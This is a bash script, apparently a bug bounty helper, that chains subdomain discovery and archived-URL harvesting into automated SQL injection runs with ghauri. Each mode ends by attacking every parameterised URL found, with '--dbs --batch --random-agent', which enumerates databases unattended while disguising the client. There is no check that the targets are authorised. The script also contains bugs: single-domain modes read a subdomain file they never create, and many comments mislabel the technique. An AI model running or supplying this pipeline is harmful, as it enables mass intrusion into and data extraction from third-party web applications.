#!/usr/bin/env bash
BOLD_BLUE="\033[1;34m"
RED="\033[0;31m"
NC="\033[0m"
BOLD_YELLOW="\033[1;33m"

# Function to display usage message
display_usage() {
    echo "Usage:"
    echo "     $0 -l http://example.com -all"
    echo "     $0 -l http://example.com -t"
    echo ""
    echo "Techniques: -all, -b, -t, -e, -bb"
    echo "          -all    All type of SQLi"
    echo "          -b      Blind sqli"
    echo "          -t      Time based sqli"
    echo "          -e      Error based sqli"
    echo "          -bb     Boolean based sqli"
    echo ""
    echo "Options:"
    echo "  -h               Display this help message"
    echo "  -d               Single site scan"
    echo "  -l               Multiple site scan"
    echo "  -c               Installing required tools"
    echo "  -i               Check if required tools are installed"
    exit 0
}

# Check if help is requested
if [[ "$1" == "-h" ]]; then
    display_usage
    exit 0
fi

# Function to check installed tools
check_tools() {
    tools=("unfurl" "subfinder" "anew" "httpx" "urlfinder" "gau" "waybackurls")

    echo "Checking required tools:"
    for tool in "${tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo -e "${BOLD_BLUE}$tool is installed at ${BOLD_WHITE}$(which $tool)${NC}"
        else
            echo -e "${RED}$tool is NOT installed or not in the PATH${NC}"
        fi
    done
}

# Check if tool installation check is requested
if [[ "$1" == "-i" ]]; then
    check_tools
    exit 0
fi

# Check if help is requested
if [[ "$1" == "-c" ]]; then
    sudo apt install unzip -y
    echo "urlfinder===================================="
    wget "https://github.com/projectdiscovery/urlfinder/releases/download/v0.0.3/urlfinder_0.0.3_linux_amd64.zip"
    unzip urlfinder_0.0.3_linux_amd64.zip
    sudo mv urlfinder /usr/local/bin/
    sudo rm -rf ./README.md urlfinder_0.0.3_linux_amd64.zip
    sudo chmod +x /usr/local/bin/urlfinder
    urlfinder -h
    echo "gau=================================="
    wget "https://github.com/lc/gau/releases/download/v2.2.4/gau_2.2.4_linux_amd64.tar.gz"
    sudo tar -xvzf gau_2.2.4_linux_amd64.tar.gz
    sudo mv gau /usr/local/bin/
    sudo chmod +x /usr/local/bin/gau
    sudo rm -rf LICENSE README.md
    gau -h
    echo "httpx=================================="
    wget "https://github.com/projectdiscovery/httpx/releases/download/v1.6.10/httpx_1.6.10_linux_amd64.zip"
    sudo unzip httpx_1.6.10_linux_amd64.zip
    sudo mv httpx /usr/local/bin/
    sudo chmod +x /usr/local/bin/httpx
    sudo rm -rf LICENSE.md README.md
    httpx -h
    echo "ghauri=================================="
    cd /opt/ && sudo git clone https://github.com/r0oth3x49/ghauri.git && cd ghauri/
    sudo chmod +x setup.py
    sudo python3 -m pip install --upgrade -r requirements.txt --break-system-packages
    sudo python3 -m pip install -e . --break-system-packages
    sudo python3 setup.py install
    cd
    ghauri -h
    
    exit 0
fi


# Time based
if [[ "$1" == "-d" && "$3" == "-all" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/single_domain/sql_injection"

    mkdir -p $main_dir

    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=BEST --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi

# Time based
if [[ "$1" == "-d" && "$3" == "-e" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/single_domain/sql_injection"

    mkdir -p $main_dir

    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=E --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi

# Time based
if [[ "$1" == "-d" && "$3" == "-b" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/single_domain/sql_injection"

    mkdir -p $main_dir

    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=B --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi

# Time based
if [[ "$1" == "-d" && "$3" == "-bb" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/single_domain/sql_injection"

    mkdir -p $main_dir

    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=BB --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi


# Time based
if [[ "$1" == "-d" && "$3" == "-t" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/single_domain/sql_injection"

    mkdir -p $main_dir

    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi

# All sqlis
if [[ "$1" == "-l" && "$3" == "-all" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/multi_domain/sql_injection"

    mkdir -p $main_dir

    subfinder -d "$domain_Without_Protocol" -recursive -all -v -o $base_dir/subfinder.txt

    cat $base_dir/subfinder.txt | anew | httpx -sc -td | grep -Eia "Apache|Nginx|PHP|ASP|ASPX|IIS|JSP" | awk '{print $1}' | sed 's,https\?://,,g' | anew | tee $base_dir/all_subdomains.txt

    urlfinder -all -list "$base_dir/all_subdomains.txt" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=BEST --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi

# Time based
if [[ "$1" == "-l" && "$3" == "-t" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/multi_domain/sql_injection"

    mkdir -p $main_dir

    subfinder -d "$domain_Without_Protocol" -recursive -all -v -o $base_dir/subfinder.txt

    cat $base_dir/subfinder.txt | anew | httpx -sc -td | grep -Eia "Apache|Nginx|PHP|ASP|ASPX|IIS|JSP" | awk '{print $1}' | sed 's,https\?://,,g' | anew | tee $base_dir/all_subdomains.txt

    urlfinder -all -list "$base_dir/all_subdomains.txt" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi


# Blind based
if [[ "$1" == "-l" && "$3" == "-b" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/multi_domain/sql_injection"

    mkdir -p $main_dir

    subfinder -d "$domain_Without_Protocol" -recursive -all -v -o $base_dir/subfinder.txt

    cat $base_dir/subfinder.txt | anew | httpx -sc -td | grep -Eia "Apache|Nginx|PHP|ASP|ASPX|IIS|JSP" | awk '{print $1}' | sed 's,https\?://,,g' | anew | tee $base_dir/all_subdomains.txt

    urlfinder -all -list "$base_dir/all_subdomains.txt" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=B --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi

# Error based
if [[ "$1" == "-l" && "$3" == "-e" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/multi_domain/sql_injection"

    mkdir -p $main_dir

    subfinder -d "$domain_Without_Protocol" -recursive -all -v -o $base_dir/subfinder.txt

    cat $base_dir/subfinder.txt | anew | httpx -sc -td | grep -Eia "Apache|Nginx|PHP|ASP|ASPX|IIS|JSP" | awk '{print $1}' | sed 's,https\?://,,g' | anew | tee $base_dir/all_subdomains.txt

    urlfinder -all -list "$base_dir/all_subdomains.txt" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=E --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi

# Error based
if [[ "$1" == "-l" && "$3" == "-bb" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/multi_domain/sql_injection"

    mkdir -p $main_dir

    subfinder -d "$domain_Without_Protocol" -recursive -all -v -o $base_dir/subfinder.txt

    cat $base_dir/subfinder.txt | anew | httpx -sc -td | grep -Eia "Apache|Nginx|PHP|ASP|ASPX|IIS|JSP" | awk '{print $1}' | sed 's,https\?://,,g' | anew | tee $base_dir/all_subdomains.txt

    urlfinder -all -list "$base_dir/all_subdomains.txt" -fs fqdn -o $base_dir/urlfinder.txt

    cat $base_dir/all_subdomains.txt | gau --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt

    cat $base_dir/all_subdomains.txt | waybackurls -no-subs | tee $base_dir/waybackurls.txt

    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt

    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --level=3 --technique=BB --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi
